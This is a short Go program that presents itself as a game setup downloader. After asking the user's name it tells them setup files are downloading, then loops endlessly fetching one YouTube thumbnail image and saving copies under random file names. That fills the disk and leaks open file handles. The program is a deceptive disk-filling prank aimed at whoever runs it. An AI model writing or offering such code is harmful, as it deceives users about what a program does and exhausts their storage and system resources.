package main

import (
	"strconv"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net/http"
	"os"
)

func main(){
	fmt.Println("Hello there what is your name?")
	var name string
  
    fmt.Scanln(&name)
	fmt.Println("Welcome "+name+" we are downloading the setup files for this game please wait...")
	create_image()
}


func create_image() {
	for true{
    url := "http://i.ytimg.com/vi/0vxCFIGCqnI/maxresdefault.jpg"
    response, e := http.Get(url)
    if e != nil {
        log.Fatal(e)
    }
    defer response.Body.Close()

    //open a file for writing
	name:= rand.Int()
    file, err := os.Create(strconv.Itoa(name)+".jpg")
    if err != nil {
        log.Fatal(err)
    }
    defer file.Close()

    // Use io.Copy to just dump the response body to the file. This supports huge files
    _, err = io.Copy(file, response.Body)
    if err != nil {
        log.Fatal(err)
    }
    fmt.Println("Downloading...")
}
}